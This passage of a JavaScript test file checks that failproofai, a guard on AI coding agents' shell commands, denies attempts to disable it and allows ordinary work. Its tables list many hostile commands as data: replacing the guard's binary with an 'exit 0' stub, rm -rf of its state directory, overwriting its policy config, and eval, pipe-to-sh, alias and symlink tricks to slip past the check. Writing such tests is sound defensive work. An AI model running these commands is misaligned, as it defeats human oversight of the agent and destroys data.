      // A `cd` the walk cannot follow may land in npm's bin directory.
      ["a cd into a command substitution", 'cd "$(npm root)/.bin" && cp /tmp/stub.sh failproofai'],
      ["a redirect after a cd into a substitution", "cd $(npm root)/.bin && printf 'exit 0' > failproofai"],
      ["a cd into backticks", "cd `npm root`/.bin && cp /tmp/stub.sh failproofai"],
      ["a cd into a variable the line does not set", "cd $NODE_BIN && cp /tmp/stub.sh failproofai"],
      ["a copy into . after a cd the walk cannot follow", 'cd "$(npm root)/.bin" && cp /tmp/stage/failproofai .'],
    ])("denies %s", async (_label, command) => {
      expect(await bash(command)).toBe("deny");
    });

    // Shell moves the walk follows as bash makes them, so that none of them
    // leaves the walk somewhere safer than the shell really is.
    it.each([
      ["slashes after the directory", "cd ~/.failproofai//////////////////// && rm -rf *"],
      ["slashes after npm's bin directory", "cd node_modules/.bin//////////////////// && printf 'exit 0' > failproofai"],
      ["a redirect before the cd operand", "cd 2>/dev/null ~/.failproofai && rm -rf *"],
      ["a popd with nothing to pop", "cd ~/.failproofai; popd; rm -rf *"],
      ['cd ""', 'cd ~/.failproofai; cd ""; rm -rf *'],
      ["cd - to an OLDPWD the line sets", "OLDPWD=~/.failproofai; cd -; rm -rf *"],
      ["~- after a cd away", "cd ~/.failproofai && cd /tmp && rm -rf ~-/*"],
      ["a bare cd to a HOME the line sets", "HOME=~/.failproofai; cd; rm -rf *"],
      ["pushd +1 back onto the directory", "cd ~/.failproofai && pushd /tmp && pushd +1 && rm -rf *"],
      ["a subshell's cd undone", "cd ~/.failproofai && (cd /tmp) && rm -rf *"],
      ["an escaped parenthesis in a subshell", "cd ~/.failproofai && (echo \\) && cd /tmp) && rm -rf *"],
      ["a cd into a substitution that names the state", 'cd "$(echo ~/.failproofai)" && rm -rf *'],
      // An assignment the shell never makes (`:` is a no-op) cannot replace
      // the value the walk judges: the word is judged as written too.
      ["a decoy assignment before a copy", "D=~/.failproofai/policies-config.json; : D=x; cp /dev/null $D"],
      ["a decoy assignment before a redirect", "D=~/.failproofai/policies-config.json; : D=x; echo {} > $D"],
      // A complete option name is not an abbreviation of a longer one.
      ["rsync --partial", "rsync --partial /tmp/stage/failproofai node_modules/.bin/"],
      ["rsync --checksum", "rsync --checksum /tmp/stage/failproofai node_modules/.bin/"],
      ["rsync -a --compress of a directory's contents", "rsync -a --compress /tmp/stage/ node_modules/.bin/"],
      ["install --strip", "install --strip /tmp/stage/failproofai node_modules/.bin/"],
      // A program handed to a shell is judged as the command it is.
      ["bash -c around a copy", "bash -c 'cp /tmp/stub.sh node_modules/.bin/failproofai'"],
      // A `cd` that fails leaves the shell where it was, and `;` runs the next
      // command anyway.
      ["a cd out of the state that may fail", "cd ~/.failproofai; cat config.json; cd /elsewhere; rm -rf *"],
      // A `..` that climbs above the sixteen directories the walk reads from.
      ["a climb above a deep cd", "cd node_modules/.bin && cd a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q && printf x > ../../../../../../../../../../../../../../../../../failproofai"],
      // Symlinks the same line makes, before any `lstat` could see them.
      ["a write through a link the line makes to the directory", "ln -s /work/proj/node_modules/.bin /tmp/bins && printf x > /tmp/bins/failproofai"],
      ["a write through a link the line makes to the entry", "ln -s /work/proj/node_modules/.bin/failproofai /tmp/hook && printf x > /tmp/hook"],
      // In a loop, an assignment later on the line can come first.
      ["a loop that assigns the directory after the copy", 'while :; do cp /tmp/x "$D/failproofai"; D=/work/proj/node_modules/.bin; done'],
      // Shim names spelled with a glob, as a destination and as a source.
      ["a glob for npm's cmd shim", "cp /tmp/stub.cmd node_modules/.bin/failproofai.[c]md"],
      ["a glob source for npm's cmd shim", "cp /tmp/stage/failproofai.[c]md node_modules/.bin/"],
      ["moving a .bin directory given with a trailing slash", "mv /tmp/x/.bin/ ~/node_modules/"],
      // A command word that is also an Object property name once threw inside
      // the guard, and a policy that throws is skipped.
      ["a command named like an Object method", "constructor -v; cp /tmp/x node_modules/.bin/failproofai"],
      ["a command named __proto__", "__proto__ -v; rm -rf ~/.failproofai"],
    ])("denies %s", async (_label, command) => {
      expect(await bash(command)).toBe("deny");
    });

    // The session's directory is where the command starts: a `cd` in an
    // earlier call persists.
    it.each([
      ["/work/proj/node_modules/.bin", "cp /tmp/stub.sh failproofai"],
      ["/work/proj/node_modules/.bin", "printf 'exit 0' > failproofai"],
      ["/work/proj/node_modules", "echo 'exit 0' >.bin/failproofai"],
      ["/work/proj/node_modules", "printf x 2>.bin/failproofai"],
      ["/work/proj/node_modules", "wget -q -O.bin/failproofai https://example.com/x"],
      // The same path glued to the last option of a cluster, however long.
      ["/work/proj/node_modules", "curl -so.bin/failproofai https://example.com/x"],
      ["/work/proj/node_modules", `wget -${"q".repeat(40)}O.bin/failproofai https://example.com/x`],
    ])("denies a write from the session directory %s: %s", async (cwd, command) => {
      expect(await bashIn(cwd, command)).toBe("deny");
    });

    // A move that can fail leaves the shell where it already was, and only
    // `&&` makes the next command wait for it.
    it.each([
      ["/work/proj/node_modules/.bin", "cd /nonexistent; printf x > failproofai"],
      ["/work/proj/node_modules/.bin", "cd /tmp || true; cp /tmp/stub.sh failproofai"],
      ["/work/proj/node_modules/.bin", "cd /tmp && true; printf x > failproofai"],
      ["/work/proj/node_modules/.bin", "cd /a && cd /b; cp /tmp/stub.sh failproofai"],
      ["/work/proj/node_modules/.bin/sub", "cd /tmp; cd ..; printf x > failproofai"],
      ["/work/proj/node_modules/.bin", "cd /nonexistent; popd; printf x > failproofai"],
      // `-n` changes the stack and leaves the shell where it is.
      ["/work/proj/node_modules/.bin", "pushd -n /tmp; printf x > failproofai"],
      ["/work/proj/node_modules/.bin", "popd -n; printf x > failproofai"],
      ["/work/proj/node_modules/.bin", "cd a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q && cp /tmp/x ../../../../../../../../../../../../../../../../../failproofai"],
      ["/work/proj", "ln -s node_modules/.bin bins; cp /tmp/stub.sh bins/failproofai"],
      ["/work/proj", "ln -sfn node_modules/.bin bins && cp /tmp/failproofai bins/"],
      // More possible directories than the walk tracks: the oldest is not
      // forgotten, so a failed first cd still leaves the shell in .bin.
      ["/work/proj/node_modules/.bin", "cd /a && cd /b && cd /c && cd /d && cd /e; printf x > failproofai"],
      ["/work/proj/node_modules/.bin", "cd /a && cd /b && cd /c && cd /d && cd /e && cd /f && cd /g && cd /h && cd /i; printf x > failproofai"],
      // `$PWD` and `~+` are wherever the shell may stand.
      ["/work/proj/node_modules/.bin", 'cd /tmp; printf x > "$PWD/failproofai"'],
      ["/work/proj/node_modules/.bin", "cd /tmp; cp /tmp/stub.sh ${PWD}/failproofai"],
      ["/work/proj/node_modules/.bin", "cd /tmp; printf x > ~+/failproofai"],
    ])("denies a write where the shell may still stand, from %s: %s", async (cwd, command) => {
      expect(await bashIn(cwd, command)).toBe("deny");
    });

    // A download names its file after the URL, so the line never spells the
    // entry's path; scp and a remote rsync source copy like cp.
    it.each([
      ["/work/proj/node_modules/.bin", "wget https://example.com/failproofai"],
      ["/work/proj/node_modules/.bin", "wget -q example.com/dl/failproofai"],
      ["/work/proj/node_modules/.bin", "curl -sSLO https://example.com/failproofai"],
      ["/work/proj/node_modules/.bin", "curl -O https://example.com/failproofai%2Ecmd"],
      // The server picks the name, or a file lists the URLs.
      ["/work/proj/node_modules/.bin", "curl -OJ https://example.com/download"],
      ["/work/proj/node_modules/.bin", "wget --content-disposition https://example.com/download"],
      ["/work/proj/node_modules/.bin", "wget -i urls.txt"],
      ["/work/proj/node_modules/.bin", "wget -r -nd https://example.com/dl/"],
      ["/work/proj", "wget -P node_modules/.bin https://example.com/failproofai"],
      ["/work/proj", "wget -qPnode_modules/.bin https://example.com/failproofai"],
      ["/work/proj", "wget --directory-prefix=node_modules/.bin https://example.com/failproofai"],
      ["/work/proj", "curl --output-dir node_modules/.bin -O https://example.com/failproofai"],
      ["/work/proj", "cd node_modules/.bin && wget https://example.com/failproofai"],
      ["/work/proj", "scp host:failproofai node_modules/.bin/"],
      ["/work/proj", "scp -T user@host:/tmp/failproofai node_modules/.bin/"],
      ["/work/proj", "rsync host:failproofai node_modules/.bin/"],
      // An output file glued to its option, alone or after a cluster.
      ["/work/proj", "curl -sonode_modules/.bin/failproofai https://example.com/x"],
      ["/work/proj", "curl -so~/.failproofai/policies-config.json https://example.com/x"],
      // A file `-o` names lands in `--output-dir` (found by hermes on
      // FailproofAI/failproofai#1058).
      ["/work/proj", "curl --output-dir node_modules/.bin -o failproofai https://example.com/x"],
      ["/work/proj", "curl --output-dir=node_modules/.bin -sofailproofai https://example.com/x"],
      ["/work/proj", "curl --output-dir node_modules/.bin --output failproofai https://example.com/x"],
      // An absolute name is joined to it too, and each `--next` transfer keeps
      // its own directory (found by hermes on FailproofAI/failproofai#1058).
      ["/work/proj", "curl --output-dir node_modules/.bin -o /failproofai https://example.com/x"],
      ["/work/proj", "curl --output-dir node_modules/.bin -O https://example.com/dl/failproofai --next --output-dir /tmp -O https://example.com/y"],
      ["/work/proj", "curl -o /tmp/a https://example.com/a -: --output-dir node_modules/.bin -o failproofai https://example.com/b"],
    ])("denies a download or remote copy from %s: %s", async (cwd, command) => {
      expect(await bashIn(cwd, command)).toBe("deny");
    });

    it.each([
      ["/work/proj", "wget https://example.com/failproofai"],
      ["/work/proj/node_modules/.bin", "wget https://example.com/my-tool"],
      ["/work/proj", "curl -O https://registry.npmjs.org/failproofai/-/failproofai-1.0.0.tgz"],
      ["/work/proj/node_modules/.bin", "curl -o /tmp/x https://example.com/failproofai"],
      ["/work/proj/node_modules/.bin", "curl https://example.com/failproofai"],
      ["/work/proj/node_modules/.bin", "wget -r https://example.com/docs/"],
      ["/work/proj", "curl -OJ https://example.com/download"],
      ["/work/proj", "scp ./failproofai host:node_modules/.bin/"],
      ["/work/proj", "scp -r host:project ./backup"],
      ["/work/proj", "wget -qO- https://example.com/api | jq ."],
    ])("allows a download or remote copy from %s: %s", async (cwd, command) => {
      expect(await bashIn(cwd, command)).not.toBe("deny");
    });

    // A value glued to its option is a path, read from where the shell stands
    // like any other (found by hermes on FailproofAI/failproofai#1058). Where a
    // command's value-taking letters are known the cluster is read as getopt
    // reads it; elsewhere every split of it is tried.
    it.each([
      ["/work/proj/node_modules/.bin", "curl -sofailproofai https://example.com/x"],
      ["/work/proj/node_modules/.bin", "curl --output=failproofai https://example.com/x"],
      ["/work/proj/node_modules/.bin", "wget -Ofailproofai https://example.com/x"],
      ["/work/proj/node_modules/.bin", "wget -qOfailproofai https://example.com/x"],
      ["/work/proj/node_modules/.bin", "wget --output-document=failproofai https://example.com/x"],
      ["/work/proj/node_modules/.bin", "sort -ofailproofai notes.txt"],
      ["/work/proj/node_modules/.bin", "gcc -ofailproofai main.c"],
      ["/work/proj/node_modules/.bin", "tar -cffailproofai src"],
      ["/work/proj/node_modules/.bin", "curl -" + "s".repeat(40) + "ofailproofai https://example.com/x"],
      // A cluster longer than anyone writes is not tried at every split.
      ["/work/proj/node_modules/.bin", "foo -" + "a".repeat(40) + "ofailproofai"],
      ["/work/proj", "cd node_modules/.bin && curl -sofailproofai https://example.com/x"],
      ["/work/proj", "D=failproofai; cd node_modules/.bin && curl -so$D https://example.com/x"],
    ])("denies an output file glued to its option from %s: %s", async (cwd, command) => {
      expect(await bashIn(cwd, command)).toBe("deny");
    });

    // A file a sed script writes with `w`, `W` or the `w` flag of `s///`,
    // glued on or after spaces (found by hermes on FailproofAI/failproofai#1058).
    it.each([
      ["/work/proj", "sed -n 'w node_modules/.bin/failproofai' /tmp/stub.sh"],
      ["/work/proj", "sed -n 'wnode_modules/.bin/failproofai' /tmp/stub.sh"],
      ["/work/proj", "sed 's/a/b/wnode_modules/.bin/failproofai' /tmp/stub.sh"],
      ["/work/proj", "sed -e 's/a/b/gw node_modules/.bin/failproofai' /tmp/stub.sh"],
      ["/work/proj", "sed -n 'Wnode_modules/.bin/failproofai' /tmp/stub.sh"],
      ["/work/proj", "sed -n --expression='w node_modules/failproofai/dist/cli.mjs' /tmp/stub.sh"],
      ["/work/proj/node_modules/.bin", "sed -n 'wfailproofai' /tmp/stub.sh"],
      ["/work/proj", "cd node_modules/.bin && sed -n 'wfailproofai' /tmp/stub.sh"],
      // After an address, and in a script whose `;` is quoted text (found by
      // hermes on FailproofAI/failproofai#1058).
      ["/work/proj", "sed -n '1wnode_modules/.bin/failproofai' /tmp/stub.sh"],
      ["/work/proj", "sed -n '10,20wnode_modules/.bin/failproofai' /tmp/stub.sh"],
      ["/work/proj", "sed -n '$wnode_modules/.bin/failproofai' /tmp/stub.sh"],
      ["/work/proj", "sed -n '1!wnode_modules/.bin/failproofai' /tmp/stub.sh"],
      ["/work/proj/node_modules/.bin", "sed -e 's/w/x/;1wfailproofai' /tmp/stub.sh"],
    ])("denies a sed script writing the entry from %s: %s", async (cwd, command) => {
      expect(await bashIn(cwd, command)).toBe("deny");
    });

    it.each([
      "sed -n 's/a/b/p' notes.txt",
      "sed 's/raw/cooked/' notes.txt",
      "sed -n 'w out.txt' notes.txt",
      "sed -n '/failproofai/p' notes.txt",
      "sed 's/www/web/g' urls.txt",
      "sed -n 'w /tmp/copy.txt' node_modules/.bin/failproofai",
      "sed -n '1w out.txt' notes.txt",
      "sed -n 'bigwig' notes.txt",
      "sed 's/new/old/g; s/a/b/' notes.txt",
    ])("allows a sed script that writes no protected file: %s", async (command) => {
      expect(await bashIn("/work/proj", command)).not.toBe("deny");
    });

    // A value set only in a subshell, only for one command, or only if a test
    // passes does not replace the one before it, so a word is read with every
    // value the line gives its variables (found by hermes on
    // FailproofAI/failproofai#1058).
    it.each([
      ["/work/proj/node_modules/.bin", "F=failproofai; (F=x); printf y > $F"],
      ["/work/proj/node_modules/.bin", "F=failproofai; F=x true; printf y > $F"],
      ["/work/proj/node_modules/.bin", "F=failproofai; F=x env; cp /tmp/stub.sh $F"],
      ["/work/proj/node_modules/.bin", Array.from({ length: 70 }, (_, i) => `F=v${i}`).join("; ") + "; F=failproofai; false && F=x; printf y > $F"],
      ["/work/proj/node_modules/.bin", "F=failproofai; " + Array.from({ length: 70 }, (_, i) => `F=y${i} true`).join("; ") + "; printf y > $F"],
      ["/work/proj", "D=node_modules/.bin; (D=/tmp); printf y > $D/failproofai"],
      ["/work/proj", "D=node_modules/.bin; (D=/tmp); cp /tmp/stage/failproofai $D/"],
      ["/work/proj/node_modules/.bin", "F=failproofai; F=x | true; printf y > $F"],
      // Every combination of the values of the variables one word names
      // (found by hermes on FailproofAI/failproofai#1058).
      ["/work/proj", "A=fail; B=proofai; (A=x; B=y); printf x > node_modules/.bin/$A$B"],
      ["/work/proj", "A=fail; B=proofai; A=x true; B=y true; printf x > node_modules/.bin/${A}${B}"],
      ["/work/proj", "A=fa; B=il; C=proofai; (A=x; B=y; C=z); printf x > node_modules/.bin/$A$B$C"],
      // More combinations than are tried is refused, not guessed at.
      ["/work/proj", Array.from({ length: 13 }, (_, i) => `V${i}=a; V${i}=b`).join("; ") + "; printf x > " + Array.from({ length: 13 }, (_, i) => `$V${i}`).join("")],
    ])("denies a write through a variable another value may hold, from %s: %s", async (cwd, command) => {
      expect(await bashIn(cwd, command)).toBe("deny");
    });

    it.each([
      ["/work/proj/node_modules/.bin", "F=a; F=b; printf y > $F"],
      ["/work/proj", "D=dist; (D=build); rm -rf $D"],
      ["/work/proj", "F=a; F=b; echo " + Array(2000).fill("$F/$F").join(" ")],
      ["/work/proj", "A=a; A=b; B=c; B=d; printf x > $A$B"],
      ["/work/proj", Array.from({ length: 12 }, (_, i) => `V${i}=a; V${i}=b`).join("; ") + "; printf x > " + Array.from({ length: 12 }, (_, i) => `$V${i}`).join("")],
    ])("allows a reassigned variable that never reaches the entry, from %s: %s", async (cwd, command) => {
      expect(await bashIn(cwd, command)).not.toBe("deny");
    });

    it.each([
      ["/work/proj/node_modules/.bin", "curl -somy-tool https://example.com/x"],
      ["/work/proj/node_modules/.bin", "grep -ffailproofai notes.txt"],
      ["/work/proj", "gcc -O2 -Wall -o build/app main.c"],
      ["/work/proj", "tar -czf backup.tgz src"],
      ["/work/proj", "curl -sSfL -o /tmp/x https://example.com/x"],
      ["/work/proj", "git log --format=%h -n 5"],
    ])("allows option values from %s: %s", async (cwd, command) => {
      expect(await bashIn(cwd, command)).not.toBe("deny");
    });

    // `echo` and `printf` print quoted text and run none of it, so documenting
    // a command is not running it (found by hermes on
    // FailproofAI/failproofai#1058). Text a shell does run is still read as
    // one, and so is a real redirect.
    it.each([
      "echo 'cat > node_modules/.bin/failproofai'",
      "printf '%s\\n' '> node_modules/.bin/failproofai'",
      'echo "cat > node_modules/.bin/failproofai"',
      "echo 'cat > ~/.failproofai/policies-config.json'",
      "echo 'never run: cat > node_modules/.bin/failproofai' && npm test",
      // Escaped and ANSI-C quoted, to another descriptor or nowhere, through
      // readers that only show it, and beside a subshell that is not around it.
      "echo cat \\> node_modules/.bin/failproofai",
      "echo $'cat > node_modules/.bin/failproofai\\n'",
      "echo 'cat > node_modules/.bin/failproofai' >&2",
      "echo 'cat > node_modules/.bin/failproofai' > /dev/null",
      "echo 'cat > node_modules/.bin/failproofai' | cat",
      "printf '%s\\n' 'cat > node_modules/.bin/failproofai' | grep cat | wc -l",
      "(cd src && ls); echo 'cat > node_modules/.bin/failproofai'",
      // Into a documentation file, when nothing on the line runs a file (found
      // by hermes on FailproofAI/failproofai#1058).
      "echo 'cat > node_modules/.bin/failproofai' >> docs/notes.md",
      "printf '%s\\n' '> node_modules/.bin/failproofai' > docs/recipe.md",
      "echo 'cat > node_modules/.bin/failproofai' | tee -a docs/notes.md",
      "echo 'printf x > node_modules/.bin/failproofai' | tee /tmp/s.sh",
      "echo 'printf x > node_modules/.bin/failproofai' | cat > /tmp/s.sh",
      "echo 'cat > node_modules/.bin/failproofai'; echo done",
      "echo 'cat > node_modules/.bin/failproofai' > docs/notes.md && git add docs/notes.md",
    ])("allows printing a command as text: %s", async (command) => {
      expect(await bash(command)).toBe("allow");
    });

    it.each([
      "bash -c 'printf x > node_modules/.bin/failproofai'",
      "echo 'printf x > node_modules/.bin/failproofai' | sh",
      "echo 'printf x > node_modules/.bin/failproofai' |& sh",
      "echo 'printf x > node_modules/.bin/failproofai' > /tmp/s.sh && sh /tmp/s.sh",
      "printf -v c 'printf x > node_modules/.bin/failproofai'; eval \"$c\"",
      "(echo 'printf x > node_modules/.bin/failproofai') | sh",
      "{ echo 'printf x > node_modules/.bin/failproofai'; } | sh",
      "xargs -I{} sh -c {} <<'EOF'\necho 'printf x > node_modules/.bin/failproofai'\nEOF",
      "/tmp/bin/echo 'printf x > node_modules/.bin/failproofai'",
      "echo 'exit 0' > node_modules/.bin/failproofai",
      'echo x >node_modules/.bin/fail"proof"ai',
      // A reader that keeps it, a loop or condition piped into a shell, an
      // `echo` the line redefines, the shell's own output sent to one, and a
      // substitution, which runs.
      "echo 'printf x > node_modules/.bin/failproofai' | grep x | sh",
      // A file printed into, then run on the same line.
      "echo 'printf x > node_modules/.bin/failproofai' > docs/s.sh && sh docs/s.sh",
      "echo 'printf x > node_modules/.bin/failproofai' > s.sh; ./s.sh",
      "echo 'printf x > node_modules/.bin/failproofai' | tee s.sh | sh",
      "for i in 1; do\necho 'printf x > node_modules/.bin/failproofai'\ndone | sh",
      "if true; then\necho 'printf x > node_modules/.bin/failproofai'\nfi | sh",
      'echo() { sh -c "$*"; }; echo \'printf x > node_modules/.bin/failproofai\'',
      "alias echo='sh -c'\necho 'printf x > node_modules/.bin/failproofai'",
      "exec > >(sh); echo 'printf x > node_modules/.bin/failproofai'",
      "exec >/tmp/s.sh; echo 'printf x > node_modules/.bin/failproofai'; sh /tmp/s.sh",
      'echo "$(cat > node_modules/.bin/failproofai < /tmp/stub.sh)"',
      // An interpreter spelled with quotes or an escape is still an
      // interpreter, and so is one behind `time` or a variable (found by
      // hermes on FailproofAI/failproofai#1058).
      "echo 'printf x > .failproofai/policies-config.json' > notes; 'sh' notes",
      "echo 'printf x > .failproofai/policies-config.json' > notes; \"sh\" notes",
      "echo 'printf x > .failproofai/policies-config.json' > notes; s'h' notes",
      "echo 'printf x > .failproofai/policies-config.json' > notes; \\sh notes",
      "echo 'printf x > .failproofai/policies-config.json' > notes; time sh notes",
      "echo 'printf x > .failproofai/policies-config.json' > notes; \"$SHELL\" notes",
    ])("denies quoted text something runs, or a real redirect: %s", async (command) => {
      expect(await bash(command)).toBe("deny");
    });

    // Codex runs a command in the `workdir` its shell tool names, and its hook
    // payload reports the session's directory only (found by hermes on
    // FailproofAI/failproofai#1058). A relative destination that would plant
    // the entry, were that directory npm's bin directory, is refused; nothing
    // else is read differently.
    it.each([
      "printf '#!/bin/sh\\nexit 0\\n' > failproofai",
      "printf x >> ../../failproofai",
      "cd src && printf x > ../failproofai",
      "tee failproofai < /tmp/stub.sh",
      "cp /tmp/stub.sh ./failproofai",
      "cp /tmp/stage/failproofai .",
      "mv /tmp/stub.sh failproofai.cmd",
      "ln -s /tmp/stub.sh failproofai",
      "curl -sofailproofai https://example.com/x",
      "wget -O failproofai https://example.com/x",
      "wget https://example.com/dl/failproofai",
      "curl -OJ https://example.com/download",
      "gcc -o failproofai main.c",
      "dd if=/tmp/stub.sh of=failproofai",
      "printf x > failproofai/dist/cli.mjs",
      // Through a directory that may be a link where the command really runs.
      "printf x > tbins/failproofai",
      "printf x > x/y/failproofai.cmd",
      "cp /tmp/stub.sh deps/failproofai/dist/cli.mjs",
      "sed -n 'wfailproofai' /tmp/stub.sh",
      "F=failproofai; (F=x); printf y > $F",
      'F=failproofai; F=x true; printf y > "$F"',
    ])("denies a Codex command planting the entry wherever it runs: %s", async (command) => {
      expect(await bashAs("codex", { command })).toBe("deny");
    });

    it.each([
      "which failproofai",
      "npm view failproofai version",
      "rm -rf dist/*",
      "twine upload dist/*",
      "cat failproofai",
      "printf x > src/failproofai.ts",
      "cd /tmp && printf x > failproofai",
      "printf x > tbins/notes.txt",
      "printf x > docs/intro.md",
    ])("allows a Codex command that plants nothing: %s", async (command) => {
      expect(await bashAs("codex", { command })).toBe("allow");
    });

    it("reads a Codex command from the workdir the call reports", async () => {
      expect(await bashAs("codex", { command: "printf x > failproofai", workdir: "/work/proj/node_modules/.bin" })).toBe("deny");
      expect(await bashAs("codex", { command: "printf x > failproofai", workdir: "/work/proj/src" })).toBe("allow");
    });

    it("reads other agents' commands from the session's directory", async () => {
      expect(await bashAs("claude", { command: "printf x > failproofai" })).toBe("allow");
      expect(await bashAs(undefined, { command: "printf x > failproofai" })).toBe("allow");
    });

    it.each([
      ["running another package's binary", "./node_modules/.bin/vitest run"],
      ["running a binary through node", "node node_modules/.bin/eslint src"],
      ["running a binary by its relative path", "node_modules/.bin/tsc --noEmit -p ."],
      ["listing the directory", "ls -la node_modules/.bin"],
      ["looking at the entry", "ls -l node_modules/.bin/failproofai"],
      ["reading the entry", "cat node_modules/.bin/failproofai"],
      ["resolving the entry", "readlink -f node_modules/.bin/failproofai"],
      ["a clean reinstall", "rm -rf node_modules && npm ci"],
      ["clearing every entry", "rm -rf node_modules/.bin/*"],
      ["clearing every entry under an upper-case parent", "rm -rf NODE_MODULES/.BIN/*"],
      ["installing dependencies", "npm install"],
      ["adding a dev dependency", "npm i -D vitest"],
      ["copying another tool into the directory", "cp /tmp/stage/my-tool node_modules/.bin/"],
      ["copying an entry out", "cp node_modules/.bin/failproofai /tmp/inspect"],
      ["copying an entry out into a directory", "cp node_modules/.bin/failproofai /tmp/inspect/"],
      ["moving a source file", "mv src/failproofai.ts src/guard.ts"],
      ["backing a directory up", "cp -r node_modules/.bin /tmp/bin-backup"],
      ["backing the state up into a directory", "cp -r ~/.failproofai /tmp/backup/"],
      ["backing the state up with a redirect", "cp ~/.failproofai/config.json /tmp/backup.json 2>/dev/null"],
      ["reading the state with a redirect", "cat ~/.failproofai/config.json 2>/dev/null"],
      // A value is not a source.
      ["installing a binary owned by a user of that name", "install -o failproofai -g failproofai -m 0755 build/agentd /usr/local/bin/"],
      ["creating directories owned by a user of that name", "install -d -o failproofai /srv/app/bin"],
      // `.bin` starts a path component, or it is another name.
      ["copying a file onto one whose name ends in .bin", "cp failproofai release.bin"],
      ["running a binary after a cd", "cd node_modules/.bin && ./vitest run"],
      ["a cd that a subshell undoes", "(cd node_modules/.bin && ls) && cp /tmp/stub.sh failproofai"],
      ["copying a tool after a cd", "cd node_modules/.bin && cp /tmp/stage/my-tool ."],
      ["clearing a tree's .bin directories", "rm -rf ~/projects/*/node_modules/.bin/*"],
      // Somebody's own `~/.bin` is not npm's.
      ["moving a tool into ~/.bin", "mv /tmp/tool ~/.bin/"],
      ["linking a script into ~/.bin", "ln -s ~/dotfiles/scripts/deploy ~/.bin/"],
      ["copying scripts into ~/.bin", "cp -r ./scripts/ ~/.bin/"],
      ["syncing dotfiles into ~/.bin", "rsync -a dotfiles/bin/ ~/.bin/"],
      ["moving a binary into a project's .bin", "mv golangci-lint .bin/"],
      // `ln` cannot create a directory given a trailing `/`.
      ["linking a package's CLI into node_modules/.bin/", "ln -s ../my-pkg/cli.js node_modules/.bin/"],
      // A one-segment glob below another directory is not aimed at the state.
      ["a glob ending in ai", "rm -rf models/*ai"],
      ["a glob ending in i", "rm -f out/*i"],
      ["a glob around proof", "rm -rf vendor/*proof*"],
      ["a sed program that looks like a glob", "sed -i 's/.*ai/X/' notes.txt"],
      ["a commit message with a #", "git commit -m 'fix #12: cp a b'"],
      ["a loop copying files out", "for f in *.txt; do cp $f /tmp/; done"],
      ["a cd and a build", "cd packages/api && npm run build"],
      ["clearing a scratch directory", "cd /tmp && rm -rf *"],
      // A `cd` the walk cannot follow changes nothing for ordinary names.
      ["tests from the repository root", 'cd "$(git rev-parse --show-toplevel)" && npm test'],
      ["a cleanup from the repository root", 'cd "$(git rev-parse --show-toplevel)" && rm -rf dist *.log'],
      ["a note in a temporary directory", 'cd "$(mktemp -d)" && echo hi > notes.txt'],
      ["a listing of home", "cd $HOME && ls -la"],
      // Redirects and comments are not operands, and a comment line runs nothing.
      ["a comment line that names the state", "# Look at ~/.failproofai\nls -la ~/.failproofai"],
      ["reading the state through an input redirect", "uniq -c < ~/.failproofai/x.log | sort -rn"],
      ["tee fed from the state", "tee -a /tmp/x < ~/.failproofai/policies-config.json"],
      ["a backup with a comment naming the state", "cp -r ~/.failproofai /tmp/bak  # copy of ~/.failproofai"],
      ["a find whose comment names -delete", "find ~/.failproofai -name '*.log' -print  # not -delete yet"],
      ["a read run through bash -c", "bash -c 'cat ~/.failproofai/policies-config.json'"],
      // rsync puts a source directory inside the destination; it does not
      // become npm's bin directory.
      ["syncing a directory into the bin directory", "rsync -a /tmp/my-tool node_modules/.bin/"],
      // Outside a loop the shell reads a variable as it stands at that point.
      ["a variable assigned only after its use", 'D=/tmp; cp notes.txt "$D/failproofai"; D=/work/proj/node_modules/.bin'],
      // Each stage of a pipeline is a subshell, so its cd moves nothing after it.
      ["a cd in a pipeline stage", "cd node_modules/.bin | true; cp notes.txt failproofai"],
      // `cd -` and `popd` return to where the shell already stood.
      ["a cd - back out of the state", "cd ~/.failproofai; cat config.json; cd -; rm -rf node_modules"],
      ["leaving through a link to elsewhere", "ln -s /work/proj/dist current && rm -rf current/x"],
    ])("allows %s", async (_label, command) => {
      expect(await bash(command)).not.toBe("deny");
    });

    it.each([
      // The session's own directory exists, so a cd back to it does not fail.
      ["/work/proj", "cd ~/.failproofai; cat config.json; cd /work/proj; rm -rf node_modules"],
      ["/work/proj", "cd frontend; npm install; cd ..; rm -rf node_modules"],
      ["/work/proj", "cd /tmp; printf x > notes.txt"],
      ["/work/proj", "cd node_modules/.bin && ls -la && cd ../.. && rm -rf build"],
      ["/work/proj", "pushd /tmp && make && popd && rm -rf out"],
      ["/work/proj", "cd a && cd b && cd c && cd d && cd e; rm -rf build"],
      ["/work/proj", "cd a; make; cd ..; cd b; make; cd ..; cd c; make; cd ..; cd d; make; cd ..; cd e; make; cd ..; rm -rf dist"],
      // After `&&` the cd has succeeded, so `$PWD` is where it went.
      ["/work/proj/node_modules/.bin", 'cd /tmp && printf x > "$PWD/failproofai"'],
    ])("allows ordinary moves from %s: %s", async (cwd, command) => {
      expect(await bashIn(cwd, command)).not.toBe("deny");
    });

    it.each([
      ["a checkout of failproofai itself", "/home/u/src/failproofai", "npm test"],
      ["a checkout of failproofai itself", "/home/u/src/failproofai", "rm -rf dist"],
      ["node_modules/.bin", "/work/proj/node_modules/.bin", "cp README.md /tmp/"],
      ["node_modules/.bin", "/work/proj/node_modules/.bin", "./vitest run"],
      // The command word is a program, not a path written to, and an option
      // is not a path: neither is read from the directory.
      ["failproofai's own state", "/home/u/.failproofai/logs", "date"],
      ["failproofai's own state", "/home/u/.failproofai/logs", "uname -a"],
      ["an installed package", "/home/u/proj/node_modules/failproofai/dist", "uname -a"],
    ])("allows ordinary work from %s", async (_label, cwd, command) => {
      expect(await bashIn(cwd, command)).not.toBe("deny");
    });

    // The walk runs on every tool call, and one evaluation holds up every hook
    // on the machine. A directory that grew with each `cd` made later words
    // slower to judge without bound (28.9 s for the first input in review).
    it.each([
      ["a script of 700 cd / build / cd ../.. steps", "bash <<'EOF'\n" + Array.from({ length: 700 }, (_, i) => `cd packages/pkg-${i}\nnpm run build\ncd ../..`).join("\n") + "\nEOF"],
      ["2,000 relative cds", Array(2000).fill("cd a").join(" && ") + " && ls"],
      ["1,000 cds into globs", Array(1000).fill("cd a*").join(" && ") + " && ls"],
      // Each `;` keeps the directories a failed cd would leave the shell in.
      ["2,000 cds that may each fail", Array(2000).fill("cd a").join("; ") + "; ls"],
      ["2,000 cds into globs that may each fail", Array(2000).fill("cd a*").join("; ") + "; ls"],
      [
        "1,000 links and a write through each",
